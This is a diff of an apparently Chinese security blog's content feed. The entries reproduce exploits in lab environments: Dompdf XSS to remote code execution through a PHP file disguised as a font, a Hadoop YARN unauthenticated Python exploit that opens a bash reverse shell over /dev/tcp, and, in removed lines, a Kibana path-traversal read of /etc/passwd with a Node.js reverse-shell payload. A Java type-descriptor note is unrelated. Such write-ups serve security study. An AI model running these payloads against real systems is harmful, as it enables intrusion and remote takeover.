+<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>远程加载资源，将在应用服务器本地缓存资源文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:9000/index.php?pdf&amp;title=%3Clink%20rel=stylesheet%20href=%27http://localhost:9001/exploit.css%27%3E</span><br></pre></td></tr></table></figure>
 
-<p>最终实现交给了getnamenative()方法。</p>
-<h2 id="类型描述符"><a href="#类型描述符" class="headerlink" title="类型描述符"></a>类型描述符</h2><p>在Class文件中，会通过类型描述符来 代表 java中的数据类型。</p>
-<p>对于非数组类型:</p>
-<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202191218383.png" class title="image-20211202191218383">
+<img src="/2022/04/20/Dompdf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20220420144937511.png" class title="image-20220420144937511">
 
+<p>访问缓存的php font文件，触发漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:9000/dompdf/lib/fonts/exploitfont_normal_3f83639933428d70e74a061f39009622.php</span><br></pre></td></tr></table></figure>
 
+<img src="/2022/04/20/Dompdf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20220420144948915.png" class title="image-20220420144948915">
 
-<p>引用类型Class的Classname，指的是它的Class文件二进制名。如java&#x2F;lang&#x2F;Thread.</p>
-<p>对于数组类型；</p>
-<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202191455708.png" class title="image-20211202191455708">
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在dompdf的配置文件中，当设置了$isRemoteEnabled（无论设置何值）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private $isRemoteEnabled = false;</span><br></pre></td></tr></table></figure>
 
-<p>即 [ + 自己元素类型的类型描述符,[的个数取决于数组的维度。</p>
-<p>我们来看看getName()方法的文档:</p>
-<ul>
-<li>对于原始数据类型，返回其 java 关键字</li>
-<li>对于非数组引用类型，返回其 Java 标准二进制名</li>
-<li>对于数组引用类型，返回它类型描述符，并将其中的 <code>\</code> 改为 <code>.</code></li>
-</ul>
-<p>前面 strs.getClass().getName()，strs 是一个数组类型，返回它的类型描述符。即 [ + 自己元素类型的类型描述符，它的元素类型是 String，String 类型的描述符是 Ljava&#x2F;lang&#x2F;String;，将其中的 &#x2F; 改为 .，得到 Ljava.lang.String;。所以strs.getClass().getName() &#x3D;&#x3D; “[Ljava.lang.String;”。</p>
+<p>都允许dompdf通过font-face CSS规则加载自定义字体，如exploit.css文件所示</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@font-face &#123;</span><br><span class="line">    font-family:&#x27;exploitfont&#x27;;</span><br><span class="line">    src:url(&#x27;http://localhost:9001/exploit_font.php&#x27;);</span><br><span class="line">    font-weight:&#x27;normal&#x27;;</span><br><span class="line">    font-style:&#x27;normal&#x27;;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>当使用外部字体是，dompdf将其缓存在本地&#x2F;lib&#x2F;fonts目录下，并在dompdf_font_family_cache.php中添加相应的条目savaFontFailies()。</p>
+<p>如上面加载远程的css文件，在dompdf_font_family_cache文件中可找到其对应的条目</p>
+<img src="/2022/04/20/Dompdf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20220420153510847.png" class title="image-20220420153510847">
+
+<p>并且在目录下找到转换后的文件</p>
+<img src="/2022/04/20/Dompdf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20220420153704816.png" class title="image-20220420153704816">
+
+<p>漏洞点在FontMetrics.php中的registerFont方法字体缓存中，如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function registerFont($style, $remoteFile, $context = null)</span><br><span class="line">   &#123;</span><br><span class="line">       $fontname = mb_strtolower($style[&quot;family&quot;]);</span><br><span class="line">       $families = $this-&gt;getFontFamilies();</span><br><span class="line"></span><br><span class="line">       $entry = [];</span><br><span class="line">       if (isset($families[$fontname])) &#123;</span><br><span class="line">           $entry = $families[$fontname];</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $styleString = $this-&gt;getType(&quot;&#123;$style[&#x27;weight&#x27;]&#125; &#123;$style[&#x27;style&#x27;]&#125;&quot;);</span><br><span class="line"></span><br><span class="line">       $fontDir = $this-&gt;options-&gt;getFontDir();</span><br><span class="line">       $remoteHash = md5($remoteFile);</span><br><span class="line"></span><br><span class="line">       $prefix = $fontname . &quot;_&quot; . $styleString;</span><br><span class="line">       $prefix = trim($prefix, &quot;-&quot;);</span><br><span class="line">       if (function_exists(&#x27;iconv&#x27;)) &#123;</span><br><span class="line">           $prefix = @iconv(&#x27;utf-8&#x27;, &#x27;us-ascii//TRANSLIT&#x27;, $prefix);</span><br><span class="line">       &#125;</span><br><span class="line">       $prefix_encoding = mb_detect_encoding($prefix, mb_detect_order(), true);</span><br><span class="line">       $substchar = mb_substitute_character();</span><br><span class="line">       mb_substitute_character(0x005F);</span><br><span class="line">       $prefix = mb_convert_encoding($prefix, &quot;ISO-8859-1&quot;, $prefix_encoding);</span><br><span class="line">       mb_substitute_character($substchar);</span><br><span class="line">       $prefix = preg_replace(&quot;[\W]&quot;, &quot;_&quot;, $prefix);</span><br><span class="line">       $prefix = preg_replace(&quot;/[^-_\w]+/&quot;, &quot;&quot;, $prefix);</span><br><span class="line"></span><br><span class="line">       $localFile = $fontDir . &quot;/&quot; . $prefix . &quot;_&quot; . $remoteHash;</span><br><span class="line"></span><br><span class="line">       if (isset($entry[$styleString]) &amp;&amp; $localFile == $entry[$styleString]) &#123;</span><br><span class="line">           return true;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $cacheEntry = $localFile;</span><br><span class="line">       $localFile .= &quot;.&quot;.strtolower(pathinfo(parse_url($remoteFile, PHP_URL_PATH), PATHINFO_EXTENSION));</span><br><span class="line"></span><br><span class="line">       $entry[$styleString] = $cacheEntry;</span><br><span class="line"></span><br><span class="line">       // Download the remote file</span><br><span class="line">       [$protocol] = Helpers::explode_url($remoteFile);</span><br><span class="line">       if (!$this-&gt;options-&gt;isRemoteEnabled() &amp;&amp; ($protocol !== &quot;&quot; &amp;&amp; $protocol !== &quot;file://&quot;)) &#123;</span><br><span class="line">           Helpers::record_warnings(E_USER_WARNING, &quot;Remote font resource $remoteFile referenced, but remote file download is disabled.&quot;, __FILE__, __LINE__);</span><br><span class="line">           return false;</span><br><span class="line">       &#125;</span><br><span class="line">       if ($protocol === &quot;&quot; || $protocol === &quot;file://&quot;) &#123;</span><br><span class="line">           $realfile = realpath($remoteFile);</span><br><span class="line"></span><br><span class="line">           $rootDir = realpath($this-&gt;options-&gt;getRootDir());</span><br><span class="line">           if (strpos($realfile, $rootDir) !== 0) &#123;</span><br><span class="line">               $chroot = $this-&gt;options-&gt;getChroot();</span><br><span class="line">               $chrootValid = false;</span><br><span class="line">               foreach ($chroot as $chrootPath) &#123;</span><br><span class="line">                   $chrootPath = realpath($chrootPath);</span><br><span class="line">                   if ($chrootPath !== false &amp;&amp; strpos($realfile, $chrootPath) === 0) &#123;</span><br><span class="line">                       $chrootValid = true;</span><br><span class="line">                       break;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">               if ($chrootValid !== true) &#123;</span><br><span class="line">                   Helpers::record_warnings(E_USER_WARNING, &quot;Permission denied on $remoteFile. The file could not be found under the paths specified by Options::chroot.&quot;, __FILE__, __LINE__);</span><br><span class="line">                   return false;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           if (!$realfile) &#123;</span><br><span class="line">               Helpers::record_warnings(E_USER_WARNING, &quot;File &#x27;$realfile&#x27; not found.&quot;, __FILE__, __LINE__);</span><br><span class="line">               return false;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           $remoteFile = $realfile;</span><br><span class="line">       &#125;</span><br><span class="line">       list($remoteFileContent, $http_response_header) = @Helpers::getFileContent($remoteFile, $context);</span><br><span class="line">       if ($remoteFileContent === null) &#123;</span><br><span class="line">           return false;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $localTempFile = @tempnam($this-&gt;options-&gt;get(&quot;tempDir&quot;), &quot;dompdf-font-&quot;);</span><br><span class="line">       file_put_contents($localTempFile, $remoteFileContent);</span><br><span class="line"></span><br><span class="line">       $font = Font::load($localTempFile);</span><br><span class="line"></span><br><span class="line">       if (!$font) &#123;</span><br><span class="line">           unlink($localTempFile);</span><br><span class="line">           return false;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $font-&gt;parse();</span><br><span class="line">       $font-&gt;saveAdobeFontMetrics(&quot;$cacheEntry.ufm&quot;);</span><br><span class="line">       $font-&gt;close();</span><br><span class="line"></span><br><span class="line">       unlink($localTempFile);</span><br><span class="line"></span><br><span class="line">       if ( !file_exists(&quot;$cacheEntry.ufm&quot;) ) &#123;</span><br><span class="line">           return false;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       // Save the changes</span><br><span class="line">       file_put_contents($localFile, $remoteFileContent);</span><br><span class="line"></span><br><span class="line">       if ( !file_exists($localFile) ) &#123;</span><br><span class="line">           unlink(&quot;$cacheEntry.ufm&quot;);</span><br><span class="line">           return false;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $this-&gt;setFontFamily($fontname, $entry);</span><br><span class="line">       $this-&gt;saveFontFamilies();</span><br><span class="line"></span><br><span class="line">       return true;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以从上方的代码看出新缓存本地文件名称为通过计算远程加载的文件的MD5值来构造的。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$font = Font::load($localTempFile);</span><br></pre></td></tr></table></figure>
+
+<p>这里文件通过php-font-lib进行加载和解析，但php-font-lib仅会检查加载文件的文件头，而忽略了文件扩展名</p>
+<p>命令执行流程如下:</p>
+<p>首先设置php文件头为有效的ttf字体，在其后添加恶意代码<?php phpinfo();?> </p>
+<img src="/2022/04/20/Dompdf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20220420160837821.png" class title="image-20220420160837821">
+
+<p>然后在加载的css文件中包含该php文件，通过xss漏洞远程加载资源文件xxx.css</p>
+<img src="/2022/04/20/Dompdf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20220420161017574.png" class title="image-20220420161017574">
+
+<p>访问xss链接引用远程css文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:9000/index.php?pdf&amp;title=&lt;link rel=stylesheet href=&#x27;http://localhost:9001/exploit.css&#x27;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>deopdf就会在&#x2F;lib&#x2F;font文件夹下缓存重命名php恶意文件</p>
+<p>访问该php文件执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost:9000/dompdf/lib/fonts/exploitfont_normal_3f83639933428d70e74a061f39009622.php</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/04/20/Dompdf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20220420161258412.png" class title="image-20220420161258412">
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://cloud.tencent.com/developer/article/1978115">dompdf中未修补的RCE漏洞会影响HTML到PDF转换器 - 云+社区 - 腾讯云 (tencent.com)</a></p>
+<p><a href="https://cn-sec.com/archives/831392.html">从 XSS 到 RCE (dompdf 0day) | CN-SEC 中文网</a></p>
+<p><a href="https://mp.weixin.qq.com/s/VGWGvYvp4hA5_RwuIbHhSQ">利用dompdf将XSS升级为RCE (qq.com)</a></p>
 ]]></content>
       <categories>
-        <category>代码审计</category>
-        <category>java</category>
-        <category>基础知识</category>
+        <category>Web漏洞</category>
+        <category>Web应用漏洞</category>
+        <category>Dompdf</category>
       </categories>
       <tags>
-        <tag>-代码 审计 -java基础知识 -类型描述符</tag>
+        <tag>-web漏洞 - Dompdf -命令执行</tag>
       </tags>
   </entry>
   <entry>
@@ -442,6 +646,106 @@
       </categories>
       <tags>
         <tag>-web漏洞 - Gitlab -命令执行</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hadoop YARN未授权访问</title>
+    <url>/2022/04/20/Hadoop%20YARN%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</url>
+    <content><![CDATA[<h1 id="Hadoop-YARN未授权访问"><a href="#Hadoop-YARN未授权访问" class="headerlink" title="Hadoop YARN未授权访问"></a>Hadoop YARN未授权访问</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Hadoop是一个由Apache的分布式系统基础架构，用户可开发分布式程序，充分利用集群的威力进行高速运算和存储，实现了一个分布式文件系统（Hadoop Distributed File System）。</p>
+<p>其中HDFS组件有高容错性的特点，并且部署在低廉的（low-cost）硬件上即可提供高吞吐量（high throughput）来访问应用程序的数据。</p>
+<p>![image-20220420105822011](Hadoop YARN未授权访问&#x2F;image-20220420105822011.png)</p>
+<p>Apache Yarn（Yet Another Resource Negotiator的缩写）是hadoop集群资源管理器系统，Yarn从hadoop 2引入，最初是为了改善MapReduce的实现，但是它具有通用性，同样执行其他分布式计算模式。</p>
+<p>ApplicationMaster负责与scheduler协商合适的container，跟踪应用程序的状态，以及监控它们的进度，ApplicationMaster是协调集群中应用程序执行的进程。每个应用程序都有自己的ApplicationMaster，负责与ResourceManager协商资源（container）和NodeManager协同工作来执行和监控任务 。</p>
+<p>当一个ApplicationMaster启动后，会周期性的向resourcemanager发送心跳报告来确认其健康和所需的资源情况，在建好的需求模型中，ApplicationMaster在发往resourcemanager中的心跳信息中封装偏好和限制，在随后的心跳中，ApplicationMaster会对收到集群中特定节点上绑定了一定的资源的container的租约，根据Resourcemanager发来的container，ApplicationMaster可以更新它的执行计划以适应资源不足或者过剩，container可以动态的分配和释放资源。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用Vulhub进行搭建</p>
+<p>![image-20220420110521767](Hadoop YARN未授权访问&#x2F;image-20220420110521767.png)</p>
+<p>浏览器访问<a href="http://ip:8088/">http://ip:8088</a></p>
+<p>![image-20220420110624008](Hadoop YARN未授权访问&#x2F;image-20220420110624008.png)</p>
+<h2 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h2><p>通过REST API提交任务执行申请新的application:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -v -X http://yourip:8088/ws/v1/cluster/apps/new-application</span><br></pre></td></tr></table></figure>
+
+<p>返回异常信息</p>
+<p>![image-20220420110903627](Hadoop YARN未授权访问&#x2F;image-20220420110903627.png)</p>
+<p>![image-20220420111006307](Hadoop YARN未授权访问&#x2F;image-20220420111006307.png)</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>先以post请求访问&#x2F;ws&#x2F;v1&#x2F;cluster&#x2F;apps&#x2F;new-application，获取application-id</p>
+<p>![image-20220420111413118](Hadoop YARN未授权访问&#x2F;image-20220420111413118.png)</p>
+<p>application-id为application_1650423858134_0001</p>
+<p>然后Post请求&#x2F;ws&#x2F;v1&#x2F;cluster&#x2F;apps,设置application-id和command命令，发送请求。</p>
+<p>![image-20220420113354614](Hadoop YARN未授权访问&#x2F;image-20220420113354614.png)</p>
+<p><strong>exp</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">target = &#x27;http://192.168.211.132:8088/&#x27;#hodoop目标地址</span><br><span class="line">lhost = &#x27;192.168.211.132&#x27; # 攻击方的IP地址</span><br><span class="line"></span><br><span class="line">url = target + &#x27;ws/v1/cluster/apps/new-application&#x27;</span><br><span class="line">resp = requests.post(url)</span><br><span class="line">app_id = resp.json()[&#x27;application-id&#x27;]</span><br><span class="line">url = target + &#x27;ws/v1/cluster/apps&#x27;</span><br><span class="line">data = &#123;</span><br><span class="line">    &#x27;application-id&#x27;: app_id,</span><br><span class="line">    &#x27;application-name&#x27;: &#x27;get-shell&#x27;,</span><br><span class="line">    &#x27;am-container-spec&#x27;: &#123;</span><br><span class="line">        &#x27;commands&#x27;: &#123;</span><br><span class="line">            &#x27;command&#x27;: &#x27;/bin/bash -i &gt;&amp; /dev/tcp/%s/1234 0&gt;&amp;1&#x27; % lhost,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#x27;application-type&#x27;: &#x27;YARN&#x27;,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json=data)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>反弹shell成功，执行命令。</p>
+<p>![image-20220420112523630](Hadoop YARN未授权访问&#x2F;image-20220420112523630.png)</p>
+<h2 id="防护建议"><a href="#防护建议" class="headerlink" title="防护建议"></a>防护建议</h2><p>1.建议项目拥有者将暴露在公网的服务<strong>端口（8040,8042,8088,50060,50070等）屏蔽掉，或做白名单访问处理。</strong></p>
+<p>2.<strong>对Hadoop web Manager服务（8088）做访问身份认证处理</strong>，对接收的数据包进行认证。</p>
+<p>3.<strong>修改默认端口</strong>，防止端口服务被批量利用。</p>
+]]></content>
+      <categories>
+        <category>Web漏洞</category>
+        <category>Web应用漏洞</category>
+        <category>Hadoop</category>
+      </categories>
+      <tags>
+        <tag>-web漏洞 - Hadoop -YARN</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>JAVA类型描述符</title>
+    <url>/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/</url>
+    <content><![CDATA[<h1 id="JAVA类型描述符"><a href="#JAVA类型描述符" class="headerlink" title="JAVA类型描述符"></a>JAVA类型描述符</h1><p>在之前学习大佬们的文章时，在代码中看到”[D”,”[Ljava.lang.String;”等奇奇怪怪的符号，说是什么java类型描述符，所以记录总结一下类型描述符的学习过程</p>
+<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>在学习cobal1tstrike大佬的Java反射文章时，附上Java反射文件链接:<a href="https://mp.weixin.qq.com/s/C6eWaD7AszqG_ily8JTbtA">Java代码审计基础 | Java反射 (qq.com)</a></p>
+<p>其中有这么一段记录,如下:</p>
+<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202113340521.png" class title="image-20211202113340521">
+
+<p>可以看到上方代码中的”[D”,”[[Ljava.lang.String;”诸如此类奇奇怪怪的符号，仔细一看原来是数组类型描述符。</p>
+<p>于是我写了个简单的打印字符串数组Demo:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.fanseTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">shuzu_Demo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String[] str1 = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;A&quot;</span>,<span class="string">&quot;B&quot;</span>,<span class="string">&quot;C&quot;</span>&#125;;</span><br><span class="line">        System.out.println(str1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果为:</p>
+<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202114946438.png" class title="image-20211202114946438">
+
+
+
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>我们来看下打印字符串数组的过程；</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PrintStream.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">println</span><span class="params">(Object x)</span> </span>&#123;</span><br><span class="line">    String s = String.valueOf(x);</span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">        print(s);</span><br><span class="line">        newLine();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// String.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">valueOf</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (obj == <span class="keyword">null</span>) ? <span class="string">&quot;null&quot;</span> : obj.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>可以看出，[Ljava.lang.String;@1540e19d是strs.toString()返回的值。strs的类型是String[],是一个数组类型，并且该数组类型没有重写toString()方法，我们来看下Object的toString方法:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> getClass().getName() + <span class="string">&quot;@&quot;</span> + Integer.toHexString(hashCode());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>@ 之后是 hashCode 的值，所以 [Ljava.lang.String; 就是 getClass().getName() 返回的值。即 strs.getClass().getName() &#x3D;&#x3D; “[Ljava.lang.String;”。</p>
+<p>我们在来看下Class的getName()方法:</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String name = <span class="keyword">this</span>.name;</span><br><span class="line">    <span class="keyword">if</span> (name == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">this</span>.name = name = getNameNative();</span><br><span class="line">    <span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最终实现交给了getnamenative()方法。</p>
+<h2 id="类型描述符"><a href="#类型描述符" class="headerlink" title="类型描述符"></a>类型描述符</h2><p>在Class文件中，会通过类型描述符来 代表 java中的数据类型。</p>
+<p>对于非数组类型:</p>
+<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202191218383.png" class title="image-20211202191218383">
+
+
+
+<p>引用类型Class的Classname，指的是它的Class文件二进制名。如java&#x2F;lang&#x2F;Thread.</p>
+<p>对于数组类型；</p>
+<img src="/2021/12/02/JAVA%E7%B1%BB%E5%9E%8B%E6%8F%8F%E8%BF%B0%E7%AC%A6/image-20211202191455708.png" class title="image-20211202191455708">
+
+<p>即 [ + 自己元素类型的类型描述符,[的个数取决于数组的维度。</p>
+<p>我们来看看getName()方法的文档:</p>
+<ul>
+<li>对于原始数据类型，返回其 java 关键字</li>
+<li>对于非数组引用类型，返回其 Java 标准二进制名</li>
+<li>对于数组引用类型，返回它类型描述符，并将其中的 <code>\</code> 改为 <code>.</code></li>
+</ul>
+<p>前面 strs.getClass().getName()，strs 是一个数组类型，返回它的类型描述符。即 [ + 自己元素类型的类型描述符，它的元素类型是 String，String 类型的描述符是 Ljava&#x2F;lang&#x2F;String;，将其中的 &#x2F; 改为 .，得到 Ljava.lang.String;。所以strs.getClass().getName() &#x3D;&#x3D; “[Ljava.lang.String;”。</p>
+]]></content>
+      <categories>
+        <category>代码审计</category>
+        <category>java</category>
+        <category>基础知识</category>
+      </categories>
+      <tags>
+        <tag>-代码 审计 -java基础知识 -类型描述符</tag>
       </tags>
   </entry>
   <entry>
@@ -850,107 +1154,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Kibana本地文件包含漏洞(CVE-2018-17246)</title>
-    <url>/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/</url>
-    <content><![CDATA[<h1 id="Kibana本地文件包含漏洞（CVE-2018-17246）"><a href="#Kibana本地文件包含漏洞（CVE-2018-17246）" class="headerlink" title="Kibana本地文件包含漏洞（CVE-2018-17246）"></a>Kibana本地文件包含漏洞（CVE-2018-17246）</h1><hr>
-<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Kibana 为 Elassticsearch 设计的一款开源的视图工具。其5.6.13到6.4.3之间的版本存在一处文件包含漏洞，通过这个漏洞攻击者可以包含任意服务器上的文件。此时，如果攻击者可以上传一个文件到服务器任意位置，即可执行代码。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ElasticSearch Kibana &lt; 6.4.3</span><br><span class="line">ElasticSearch Kibana &lt; 5.6.13</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="搜索规则"><a href="#搜索规则" class="headerlink" title="搜索规则"></a>搜索规则</h2><p>zoomeye:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app:&quot;kibana&quot;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>Fofa:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;kibana&quot;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>使用Vulhub集成漏洞环境进行搭建，命令如下:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd vulhub-master/kibana/CVE-2018-17246</span><br><span class="line"> </span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-
-
-
-<p>kibana默认端口为5601,环境搭建成功后访问Kibana默认首页。</p>
-<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125113942130.png" class title="image-20211125113942130">
-
-
-
-<h3 id="复现流程"><a href="#复现流程" class="headerlink" title="复现流程"></a>复现流程</h3><h4 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p>这里通过设置apis参数为需要包含的文件，这里设置为&#x2F;etc&#x2F;passwd文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.211.129:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=../../../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
-
-
-
-<p>可以看到服务器响应500</p>
-<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125134712598.png" class title="image-20211125134712598">
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose logs</span><br></pre></td></tr></table></figure>
-
-<p>查看kibana的日志，可以看到&#x2F;etc&#x2F;passwd文件已经被包含</p>
-<img src="/2021/11/25/Kibana%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E(CVE-2018-17246)/image-20211125135321214.png" class title="image-20211125135321214">
-
-
-
-<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>这里我们写个反弹shell的js语句，将其放到kibana的docker镜像中</p>
-<p>js代码如下:</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">&quot;net&quot;</span>),</span><br><span class="line">        cp = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>),</span><br><span class="line">        sh = cp.spawn(<span class="string">&quot;/bin/bash&quot;</span>, []);</span><br><span class="line">    <span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket();</span><br><span class="line">    client.connect(<span class="number">12345</span>, <span class="string">&quot;127.0.0.1&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        client.pipe(sh.stdin);</span><br><span class="line">        sh.stdout.pipe(client);</span><br><span class="line">        sh.stderr.pipe(client);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="regexp">/a/</span>;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
-
-
-
-<p>将本地创建的文件复制到kibana镜像中的&#x2F;tmp&#x2F;shell.js文件</p>
-<p>命令:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker cp 你的文件路径 容器长ID:docker容器路径</span><br></pre></td></tr></table></figure>
-
